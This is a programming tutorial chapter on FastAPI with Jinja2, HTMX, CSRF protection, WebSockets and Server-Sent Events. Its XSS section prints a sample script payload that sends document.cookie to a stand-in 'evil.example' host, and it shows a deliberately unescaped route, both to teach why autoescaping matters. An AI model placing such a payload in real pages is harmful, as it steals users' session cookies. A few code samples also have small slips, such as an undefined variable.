---
chapter: 28
part: 4
title: "Templates, HTMX & Real-Time"
summary: Render HTML from FastAPI with Jinja2, escape user input correctly, add HTMX for live search and inline editing without a JavaScript framework, and push updates over WebSockets without leaking dead connections.
minutes: 50
tags: [jinja2, templates, htmx, xss, csrf, websockets, sse]
---

Chapters 26 and 27 built an API that speaks JSON. Plenty of applications should stay there. But
StudyHub is used by humans in a browser, and humans should not have to wait for a JavaScript
bundle to see a list of flashcards. Rendering HTML on the server is faster to build, faster to
load, and — with autoescaping on — safer by default. This chapter covers server-rendered pages
with Jinja2, then HTMX, which lets those pages update themselves by swapping small HTML fragments
instead of re-rendering everything, and finally WebSockets for the cases where the server needs to
push without being asked.

## Installing and wiring Jinja2

```bash
python3 -m pip install jinja2 python-multipart itsdangerous
```

```text
studyhub/
├── app/
│   ├── main.py
│   └── routers/
│       ├── pages.py
│       └── decks.py
├── templates/
│   ├── base.html
│   ├── decks/
│   │   ├── index.html
│   │   └── row.html
│   └── partials/
│       └── flash.html
└── static/
    ├── app.css
    └── htmx.min.js
```

```python
# app/main.py
from pathlib import Path

from fastapi import FastAPI
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates

BASE_DIR = Path(__file__).resolve().parent.parent

templates = Jinja2Templates(directory=BASE_DIR / "templates")

app = FastAPI(title="StudyHub")
app.mount("/static", StaticFiles(directory=BASE_DIR / "static"), name="static")
```

`app.mount` serves everything under `/static` straight from disk, with correct content types and
caching headers. In production you put a real web server in front of it (Chapter 29), but keeping
the same URL during development means no surprises.

## Rendering a page

```python
# app/routers/pages.py
from typing import Annotated

from fastapi import APIRouter, Depends, Request
from fastapi.responses import HTMLResponse

from app.deps import CurrentUser, SessionDep
from app.main import templates
from app.models import Deck

router = APIRouter(tags=["pages"])


@router.get("/", response_class=HTMLResponse)
def home(request: Request, session: SessionDep, current_user: CurrentUser):
    decks = session.scalars(
        Deck.__table__.select().where(Deck.owner_id == current_user.id)
    )
    return templates.TemplateResponse(
        request=request,
        name="decks/index.html",
        context={"decks": decks, "user": current_user},
    )
```

The two arguments that matter: `request` must be in the context (Jinja2 needs it for `url_for`),
and `name` is the path relative to your templates directory. `context` is the dictionary of
variables available in the template.

## Template inheritance

One skeleton, many pages. `base.html` holds everything that repeats:

```html
<!-- templates/base.html -->
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>{% block title %}StudyHub{% endblock %}</title>
  <link rel="stylesheet" href="{{ url_for('static', path='/app.css') }}">
  <script src="{{ url_for('static', path='/htmx.min.js') }}" defer></script>
</head>
<body>
  <header>
    <a href="{{ url_for('home') }}">StudyHub</a>
    {% if user %}
      <span>{{ user.email }}</span>
      <form method="post" action="{{ url_for('logout') }}">
        <button type="submit">Log out</button>
      </form>
    {% endif %}
  </header>

  <main>
    {% block content %}{% endblock %}
  </main>

  {% block scripts %}{% endblock %}
</body>
</html>
```

A child page fills the blocks:

```html
<!-- templates/decks/index.html -->
{% extends "base.html" %}
{% block title %}My decks{% endblock %}

{% block content %}
  <h1>My decks</h1>
  {% include "partials/new_deck_form.html" %}

  <table>
    <tbody id="deck-rows">
      {% for deck in decks %}
        {% include "decks/row.html" %}
      {% else %}
        <tr><td colspan="3">No decks yet. Create one above.</td></tr>
      {% endfor %}
    </tbody>
  </table>
{% endblock %}
```

`{% extends %}` must be the first thing in the file. `{% include %}` pulls in a fragment — the
same fragment you will later return from Python for HTMX, which is the whole trick: **one template
serves both the full page and the partial update.** The `{% else %}` on a `for` loop fires when
the collection is empty, which beats an `{% if %}` wrapper.

Filters transform values on the way out:

```html
<p>{{ deck.description | default("No description", true) | truncate(80) }}</p>
<p>{{ deck.cards | length }} cards</p>
<time datetime="{{ deck.created_at | isoformat }}">{{ deck.created_at | humanize }}</time>
```

Register your own on the shared environment:

```python
def humanize(value):
    return value.strftime("%d %b %Y")


templates.env.filters["humanize"] = humanize
```

`url_for` takes the *function name* of a path operation, not its path — `url_for('home')`,
`url_for('get_deck', deck_id=3)`. Renaming a route no longer breaks every template.

## Autoescaping and XSS

Here is the attack. A user names a deck:

```html
<script>fetch('https://evil.example/steal?c=' + document.cookie)</script>
```

If you render that with `HTMLResponse` and an f-string, every visitor to the decks page runs the
script and their session cookie leaves the building:

```python
# NEVER do this
@router.get("/decks/raw")
def bad(request: Request):
    html = "".join(f"<li>{d.name}</li>" for d in decks)
    return HTMLResponse(f"<ul>{html}</ul>")
```

Jinja2, as configured by `Jinja2Templates`, autoescapes `.html` templates. The same string becomes
visible text:

```html
<li>&lt;script&gt;fetch(&#39;https://evil.example/steal?c=&#39; + document.cookie)&lt;/script&gt;</li>
```

The user sees the literal text; nothing executes. You defeat this protection in exactly three
ways, and all three are usually mistakes:

```python
Jinja2Templates(directory=..., autoescape=False)   # disables it globally
```

```html
{{ deck.name | safe }}          {# promises the string is already safe #}
{% autoescape false %} ... {% endautoescape %}
```

Use `| safe` only for strings you built yourself, such as output from a Markdown library that
already escaped its input. Never apply it to anything a user typed.

:::danger Autoescaping does not cover every context
Escaping HTML entities is correct for text between tags. It is not sufficient inside a
`<script>` block, inside an HTML attribute used as a URL (`href="{{ user_url }}"` allows
`javascript:`), or inside a CSS/JS string. For JSON embedded in a page use
`{{ data | tojson }}`, and validate any user-supplied URL scheme before putting it in `href`.
:::

## Forms, and CSRF in ten lines

A browser will happily send a `POST` to your site from a form hosted on someone else's page,
carrying your user's cookie. That is Cross-Site Request Forgery. The defence is a token that the
attacker cannot read: put a random value in a cookie and require the same value in the form.

```python
# app/security.py
import secrets

from fastapi import Cookie, Form, HTTPException, Response, status


def issue_csrf(response: Response) -> str:
    token = secrets.token_urlsafe(32)
    response.set_cookie("csrf_token", token, httponly=True, samesite="lax", secure=True)
    return token


def verify_csrf(
    csrf_token: Annotated[str, Form(alias="csrf_token")],
    cookie_token: Annotated[str | None, Cookie(alias="csrf_token")] = None,
) -> None:
    if not cookie_token or not secrets.compare_digest(csrf_token, cookie_token):
        raise HTTPException(status_code=status.HTTP_403_FORBIDDEN, detail="Bad CSRF token")
```

```html
<form method="post" action="{{ url_for('create_deck_page') }}">
  <input type="hidden" name="csrf_token" value="{{ csrf_token }}">
  <input name="name" required maxlength="80">
  <button type="submit">Create</button>
</form>
```

```python
@router.post("/decks", response_class=HTMLResponse)
def create_deck_page(request: Request, name: Annotated[str, Form()],
                     session: SessionDep, current_user: CurrentUser,
                     _csrf: None = Depends(verify_csrf)):
    session.add(Deck(name=name, owner_id=current_user.id))
    session.commit()
    return templates.TemplateResponse(
        request=request, name="decks/row.html",
        context={"deck": deck}, status_code=status.HTTP_201_CREATED,
    )
```

`secrets.compare_digest` compares in constant time, so an attacker cannot measure the difference
between a near-miss and a total miss. Every state-changing route takes `Depends(verify_csrf)`;
make a checklist, because forgetting one is the normal failure mode.

## HTMX: HTML fragments over the wire

The idea is small enough to state in one sentence: an HTMX attribute makes an HTTP request and
puts the **HTML** the server returns into a part of the page. No JSON parsing, no client-side
state, no build step. Your Python endpoint returns a rendered fragment instead of a dict.

| Attribute | Meaning |
| --- | --- |
| `hx-get` / `hx-post` / `hx-put` / `hx-delete` | URL and method to request |
| `hx-target` | CSS selector for where the response goes (default: the element itself) |
| `hx-swap` | How to insert it: `innerHTML`, `outerHTML`, `beforeend`, `afterbegin`, `delete` |
| `hx-trigger` | What fires it: `click`, `input changed delay:300ms`, `keyup[key=='Enter']`, `load` |
| `hx-include` | Which other elements' values to send along |
| `hx-swap-oob` | Out-of-band: update a second element from the same response |

Copy `htmx.min.js` into `static/` and load it once in `base.html` with the `defer` attribute.

### Live search

```html
<input type="search" name="q" placeholder="Search decks..."
       hx-get="{{ url_for('search_decks') }}"
       hx-target="#deck-rows"
       hx-trigger="input changed delay:300ms"
       hx-swap="innerHTML">

<table><tbody id="deck-rows">
  {% for deck in decks %}{% include "decks/row.html" %}{% endfor %}
</tbody></table>
```

`delay:300ms` debounces: the request fires 300ms after the user stops typing instead of on every
keystroke. `changed` skips requests when the value is unchanged, so pressing arrow keys does not
hammer the server.

```python
@router.get("/decks/search", response_class=HTMLResponse)
def search_decks(request: Request, session: SessionDep,
                 current_user: CurrentUser, q: str = ""):
    stmt = select(Deck).where(Deck.owner_id == current_user.id)
    if q:
        stmt = stmt.where(Deck.name.ilike(f"%{q}%"))
    decks = session.scalars(stmt.order_by(Deck.name).limit(50)).all()
    return templates.TemplateResponse(
        request=request,
        name="decks/rows.html",
        context={"decks": decks, "query": q},
    )
```

`decks/rows.html` contains only `<tr>` elements — no `<html>`, no layout. The initial page render
and the live search both include it, so there is one source of truth for how a row looks.

### Inline editing

```html
<!-- templates/decks/row.html -->
<tr id="deck-{{ deck.id }}">
  <td>{{ deck.name }}</td>
  <td>{{ deck.cards | length }}</td>
  <td>
    <button hx-get="{{ url_for('edit_deck', deck_id=deck.id) }}"
            hx-target="#deck-{{ deck.id }}"
            hx-swap="outerHTML">Edit</button>
  </td>
</tr>
```

Clicking Edit replaces the row with a form that PUTs and swaps itself back:

```html
<!-- templates/decks/edit_row.html -->
<tr id="deck-{{ deck.id }}">
  <td colspan="3">
    <form hx-put="{{ url_for('rename_deck', deck_id=deck.id) }}"
          hx-target="#deck-{{ deck.id }}"
          hx-swap="outerHTML"
          hx-include="this">
      <input type="hidden" name="csrf_token" value="{{ csrf_token }}">
      <input name="name" value="{{ deck.name }}" required>
      <button type="submit">Save</button>
      <button type="button"
              hx-get="{{ url_for('view_deck', deck_id=deck.id) }}"
              hx-target="#deck-{{ deck.id }}"
              hx-swap="outerHTML">Cancel</button>
    </form>
  </td>
</tr>
```

`hx-include="this"` sends every named input in the form. The response is `row.html` again, so the
row returns to read-only mode without a page reload.

### Out-of-band swaps and headers

A response can update somewhere else too — a status line, a counter, a toast:

```html
<div id="flash" hx-swap-oob="true">Deck renamed.</div>
<tr id="deck-{{ deck.id }}"> ... </tr>
```

Python can also drive HTMX through response headers, which is the cleanest way to do a redirect
after a delete:

```python
from fastapi import Response

response = Response(status_code=status.HTTP_200_OK, headers={"HX-Redirect": "/decks"})
```

:::tip Make it work without JavaScript first
Write the form as a normal `<form method="post" action="...">` that returns a full page. HTMX
attributes then upgrade it in place. Users with JS disabled, search crawlers, and the three
seconds before `htmx.min.js` loads all keep working. This is progressive enhancement, and it costs
you almost nothing if you do it from the start.
:::

### When HTMX is not enough

Reach for a client framework when the UI has substantial state that lives on the client: offline
support, drag-and-drop canvases, collaborative editing with local conflict resolution, complex
multi-step wizards with client-side validation, or a native mobile wrapper. HTMX is a poor fit
when every keystroke needs local computation, because every interaction costs a round trip.
Choosing server-rendered + HTMX means choosing a small team, a fast first paint and one language.
Choosing an SPA means choosing a richer client at the price of two codebases, a build pipeline,
and a JSON API you now have to keep in sync with the UI.

## WebSockets

HTMX is still request/response. When the server must speak first — chat, notifications, a live
progress bar — you need a persistent connection. FastAPI supports WebSockets natively:

```python
# app/routers/ws.py
import json
import logging
from typing import Annotated

from fastapi import APIRouter, Cookie, WebSocket, WebSocketDisconnect, status

from app.security import decode_access_token

router = APIRouter(tags=["realtime"])
logger = logging.getLogger("studyhub.ws")


class ConnectionManager:
    def __init__(self) -> None:
        self.rooms: dict[str, set[WebSocket]] = {}

    async def connect(self, room: str, websocket: WebSocket) -> None:
        await websocket.accept()
        self.rooms.setdefault(room, set()).add(websocket)

    def disconnect(self, room: str, websocket: WebSocket) -> None:
        connections = self.rooms.get(room)
        if connections is None:
            return
        connections.discard(websocket)
        if not connections:
            del self.rooms[room]

    async def broadcast(self, room: str, message: str) -> None:
        for websocket in list(self.rooms.get(room, ())):
            try:
                await websocket.send_text(message)
            except Exception:
                logger.warning("dropping dead websocket in %s", room)
                self.disconnect(room, websocket)


manager = ConnectionManager()


@router.websocket("/ws/{room}")
async def room_socket(
    websocket: WebSocket,
    room: str,
    access_token: Annotated[str | None, Cookie()] = None,
) -> None:
    user_id = None if access_token is None else decode_access_token(access_token)
    if user_id is None:
        await websocket.close(code=status.WS_1008_POLICY_VIOLATION)
        return

    await manager.connect(room, websocket)
    await manager.broadcast(room, f"user {user_id} joined")
    try:
        while True:
            payload = await websocket.receive_text()
            await manager.broadcast(room, json.dumps({"from": user_id, "text": payload}))
    except WebSocketDisconnect:
        pass
    finally:
        manager.disconnect(room, websocket)
        await manager.broadcast(room, f"user {user_id} left")
```

The sequence is always `accept()` → loop on `receive_*()` → `send_*()`. Note the ordering
details that matter:

- **Authenticate before `accept()`.** Once accepted, the connection is established; rejecting
  later is more awkward. Cookies are sent with the handshake, so the same cookie auth from
  Chapter 27 works here.
- **`finally` is the safety net.** `WebSocketDisconnect` fires on a clean close, but a crashed
  client, a killed tab or a broken proxy can raise `RuntimeError` or surface as a failed send.
  The `finally` block unregisters the socket either way.
- **`broadcast` iterates a copy** (`list(...)`) because `disconnect` mutates the set.

Connect from the browser with plain JavaScript:

```html
<script>
  const room = "deck-42";
  const ws = new WebSocket(`ws://${location.host}/ws/${room}`);
  ws.onmessage = (event) => {
    const li = document.createElement("li");
    li.textContent = event.data;
    document.querySelector("#messages").append(li);
  };
  document.querySelector("#chat").addEventListener("submit", (e) => {
    e.preventDefault();
    ws.send(new FormData(e.target).get("text"));
    e.target.reset();
  });
</script>
```

Use `textContent`, not `innerHTML`, for anything arriving over a socket — the same XSS rule from
earlier still applies, and nothing autoescapes client-side JavaScript.

:::pitfall Broadcasting without handling disconnects
A `ConnectionManager` that only ever adds sockets and never removes them works perfectly in
development. In production, every laptop lid that closes leaves an entry in the set; the
connection is dead but your code does not know yet. Each broadcast eventually raises on a dead
socket, and because the exception propagates out of the loop, the users *after* the dead one in
the set never receive the message — so one stale connection silently stops delivery for everyone
behind it. Memory grows, latency grows, and the failure looks random. Wrap each `send` in
`try/except`, drop failures, and unregister in a `finally`.
:::

### Server-Sent Events as the simpler option

If the client only needs to receive — notifications, a progress bar, a live count — WebSockets are
overkill. SSE is a normal HTTP request that never ends:

```python
import asyncio
import json
from datetime import datetime, timezone

from fastapi import Request
from fastapi.responses import StreamingResponse


@app.get("/events")
async def events(request: Request) -> StreamingResponse:
    async def stream():
        while True:
            if await request.is_disconnected():
                break
            payload = {"time": datetime.now(tz=timezone.utc).isoformat()}
            yield f"data: {json.dumps(payload)}\n\n"
            await asyncio.sleep(10)

    return StreamingResponse(stream(), media_type="text/event-stream",
                             headers={"Cache-Control": "no-cache"})
```

```html
<div id="clock" hx-sse="connect:/events swap:message"></div>
```

SSE reconnects automatically, passes through proxies that mangle WebSocket upgrades, and needs no
extra server. Choose it unless you genuinely need client-to-server streaming.

:::scenario Notifications work for a week, then stop for everyone
StudyHub ships a WebSocket notification channel. QA passes: two browsers, messages flow. A week
after launch, notifications stop arriving and a restart fixes it for a few hours. The logs show a
trickle of `RuntimeError: Unexpected ASGI message 'websocket.send'` and nothing else.
:::

:::solution Treat every send as fallible and prove it with a test
The manager appends sockets on connect and removes them only on `WebSocketDisconnect` — which
never fires when a laptop sleeps, a mobile network drops, or a load balancer times out an idle
connection. Dead sockets accumulate, and because `broadcast` awaits each one in order, the first
dead socket raises and aborts delivery for every socket after it. That explains "stops for
everyone" and "a restart fixes it".

Fix it in three places:

```python
async def broadcast(self, room: str, message: str) -> None:
    for websocket in list(self.rooms.get(room, ())):
        try:
            await websocket.send_text(message)
        except Exception:
            logger.warning("dropping dead websocket in %s", room)
            self.disconnect(room, websocket)
```

1. **Drop on failure**, as above, and iterate a copy of the set.
2. **Add a heartbeat**: `ping_interval=20, ping_timeout=20` on the endpoint (or your own
   `asyncio` ping task) so stale sockets are discovered in seconds rather than never.
3. **Test the failure path** with `TestClient`:

```python
def test_broadcast_drops_dead_socket():
    manager = ConnectionManager()

    class Dead:
        async def send_text(self, message):
            raise RuntimeError("connection closed")

        async def accept(self):
            pass

    dead = Dead()
    import asyncio

    asyncio.run(manager.connect("room", dead))
    asyncio.run(manager.broadcast("room", "hello"))
    assert manager.rooms.get("room", set()) == set()
```

If one dead socket cannot stop delivery to the others, the bug class is gone. Log every drop — the
rate of drops is your early warning that a proxy is killing connections too aggressively.
:::

## Key takeaways

- `Jinja2Templates` plus `TemplateResponse(request=request, name=..., context=...)` renders HTML;
  `app.mount("/static", ...)` serves assets.
- `{% extends %}`, `{% block %}` and `{% include %}` mean one fragment serves both the full page
  and a partial update; `url_for` refers to route function names, not paths.
- Jinja2 autoescapes `.html` by default, which is what stops stored XSS; `| safe` and
  `autoescape=False` opt out and are almost always wrong for user input.
- CSRF protection is a token in a cookie matched against a hidden form field, compared with
  `secrets.compare_digest`, applied to every state-changing route.
- HTMX swaps server-rendered HTML fragments into the page using `hx-get`/`hx-target`/`hx-swap`/
  `hx-trigger`/`hx-include`, with `hx-swap-oob` for secondary updates.
- WebSockets follow `accept()` → receive loop → send, must authenticate before accepting, and must
  unregister in a `finally` block.
- Prefer SSE when the client only receives; it reconnects automatically and survives proxies that
  break WebSocket upgrades.

## Practice

- [ ] Build a `base.html` with a `content` block and two child pages, then add a custom Jinja
      filter that formats a `datetime` as "3 days ago" and use it in a template.
- [ ] Add a `GET /decks/{id}/cards` page that lists cards, using `selectinload` and a partial
      template reused by the full page and an HTMX refresh button.
- [ ] Add a live search box for cards with `hx-trigger="input changed delay:300ms"` and a Python
      handler that returns only the matching `<tr>` fragments.
- [ ] Add inline rename: a row that swaps to a form on click, PUTs, and swaps back to read-only,
      including CSRF and 404 handling for someone else's deck.
- [ ] Add a WebSocket notification channel keyed by user id with a `ConnectionManager` that drops
      dead sockets, plus a test asserting a broadcast survives one dead connection.
- [ ] Convert the notification channel to SSE and document in one paragraph which one you would
      ship for StudyHub and why.

## Solutions

:::solution Exercise 1
```python
# app/main.py
from datetime import datetime, timezone


def timeago(value: datetime) -> str:
    delta = datetime.now(tz=timezone.utc) - value
    if delta.days == 0:
        return "today"
    if delta.days == 1:
        return "yesterday"
    return f"{delta.days} days ago"


templates.env.filters["timeago"] = timeago
```
```html
{% extends "base.html" %}
{% block content %}
  <p>Updated {{ deck.updated_at | timeago }}</p>
{% endblock %}
```
Filters receive the value on the left and return a string, so registration is a single assignment
on `templates.env.filters`. Keeping the formatting in Python rather than in JavaScript means the
same logic is used by the initial render and by every HTMX swap.
:::

:::solution Exercise 2
```html
<!-- templates/decks/cards.html -->
{% extends "base.html" %}
{% block content %}
  <h1>{{ deck.name }}</h1>
  <button hx-get="{{ url_for('deck_cards_partial', deck_id=deck.id) }}"
          hx-target="#cards" hx-swap="innerHTML">Refresh</button>
  <ul id="cards">
    {% include "partials/card_list.html" %}
  </ul>
{% endblock %}
```
```python
@router.get("/decks/{deck_id}/cards/partial", response_class=HTMLResponse)
def deck_cards_partial(request: Request, deck_id: int, session: SessionDep,
                       current_user: CurrentUser):
    deck = session.scalars(
        select(Deck).options(selectinload(Deck.cards))
        .where(Deck.id == deck_id, Deck.owner_id == current_user.id)
    ).one_or_none()
    if deck is None:
        raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Deck not found")
    return templates.TemplateResponse(request=request, name="partials/card_list.html",
                                      context={"cards": deck.cards})
```
The partial is rendered by the page on first load and by the endpoint on refresh, so the markup can
never drift between the two paths. `selectinload` is mandatory here: serialization touches
`deck.cards` after the handler returns.
:::

:::solution Exercise 3
```html
<input type="search" name="q" placeholder="Search cards..."
       hx-get="{{ url_for('search_cards', deck_id=deck.id) }}"
       hx-target="#cards" hx-swap="innerHTML"
       hx-trigger="input changed delay:300ms">
```
```python
@router.get("/decks/{deck_id}/cards/search", response_class=HTMLResponse)
def search_cards(request: Request, deck_id: int, session: SessionDep,
                 current_user: CurrentUser, q: str = ""):
    stmt = select(Card).join(Deck).where(
        Deck.id == deck_id, Deck.owner_id == current_user.id
    )
    if q:
        stmt = stmt.where(Card.front.ilike(f"%{q}%"))
    cards = session.scalars(stmt.limit(50)).all()
    return templates.TemplateResponse(request=request, name="partials/card_list.html",
                                      context={"cards": cards})
```
Searching inside `Deck.owner_id == current_user.id` keeps authorization intact for the partial
route — a common bug is securing the page but not the fragment endpoint it calls. The `limit(50)`
is what stops a one-character query from returning ten thousand rows.
:::

:::solution Exercise 4
```python
@router.put("/decks/{deck_id}/row", response_class=HTMLResponse)
def rename_deck(request: Request, deck_id: int,
                name: Annotated[str, Form(min_length=1, max_length=80)],
                session: SessionDep, current_user: CurrentUser,
                _csrf: None = Depends(verify_csrf)):
    deck = session.scalars(
        select(Deck).where(Deck.id == deck_id, Deck.owner_id == current_user.id)
    ).one_or_none()
    if deck is None:
        raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Deck not found")
    deck.name = name
    session.commit()
    return templates.TemplateResponse(request=request, name="decks/row.html",
                                      context={"deck": deck})
```
Returning `row.html` with `hx-swap="outerHTML"` replaces the form with the read-only row. The
ownership check lives in the query, so a forged `PUT` against another user's id gets 404 and the
attacker learns nothing. Escaping is automatic, so a name containing `<script>` is stored and
displayed as text.
:::

:::solution Exercise 5
```python
class NotifyManager:
    def __init__(self) -> None:
        self.sockets: dict[int, set[WebSocket]] = {}

    async def connect(self, user_id: int, ws: WebSocket) -> None:
        await ws.accept()
        self.sockets.setdefault(user_id, set()).add(ws)

    def disconnect(self, user_id: int, ws: WebSocket) -> None:
        conns = self.sockets.get(user_id)
        if not conns:
            return
        conns.discard(ws)
        if not conns:
            del self.sockets[user_id]

    async def notify(self, user_id: int, text: str) -> None:
        for ws in list(self.sockets.get(user_id, ())):
            try:
                await ws.send_text(text)
            except Exception:
                self.disconnect(user_id, ws)
```
```python
def test_notify_survives_dead_socket():
    import asyncio

    manager = NotifyManager()

    class Dead:
        async def accept(self): pass
        async def send_text(self, m): raise RuntimeError("dead")

    class Alive:
        def __init__(self): self.sent = []
        async def accept(self): pass
        async def send_text(self, m): self.sent.append(m)

    dead, alive = Dead(), Alive()
    asyncio.run(manager.connect(7, dead))
    asyncio.run(manager.connect(7, alive))
    asyncio.run(manager.notify(7, "you have 3 cards due"))

    assert alive.sent == ["you have 3 cards due"]
    assert manager.sockets[7] == {alive}
```
The assertion that matters is `alive.sent` — with an unguarded loop, the exception from `dead`
would abort the broadcast and the healthy socket would receive nothing. Keying by user id also
prevents notifying the wrong person.
:::

:::solution Exercise 6
```python
@router.get("/notifications/stream")
async def notification_stream(request: Request, current_user: CurrentUser):
    async def stream():
        last_seen = 0
        while True:
            if await request.is_disconnected():
                break
            # poll cheaply; swap for LISTEN/NOTIFY or Redis pub/sub in production
            yield f"data: {json.dumps({'unread': unread_count(current_user.id)})}\n\n"
            await asyncio.sleep(15)

    return StreamingResponse(stream(), media_type="text/event-stream")
```
```html
<div hx-sse="connect:/notifications/stream">
  <span hx-sse="swap:message"></span>
</div>
```
For StudyHub I would ship SSE: notifications are one-directional, and SSE gives automatic
reconnection, plain HTTP through any proxy, and no connection manager to get wrong. Reach for
WebSockets only when the browser must stream back — live chat, cursors, multiplayer state. Both
approaches still need the same authorization check on the endpoint that opens the stream.
:::
